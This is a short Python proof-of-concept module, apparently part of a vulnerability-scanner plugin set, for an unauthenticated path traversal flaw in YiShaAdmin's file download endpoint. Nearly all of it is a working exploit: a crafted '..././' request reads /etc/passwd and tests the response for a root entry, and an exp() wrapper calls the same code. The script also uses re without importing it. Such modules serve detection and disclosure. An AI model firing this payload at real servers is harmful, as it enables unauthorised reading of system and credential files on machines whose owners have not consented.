import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''yishaadmin path traversal''',
        "description": '''An endpoint in yshaadmin "/admin/File/DownloadFile" was improperly secured, allowing for files to be downloaded, read or deleted without any authentication.''',
        "severity": "high",
        "references": [
            "https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/", 
            "https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["lfi", "yishaadmin"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url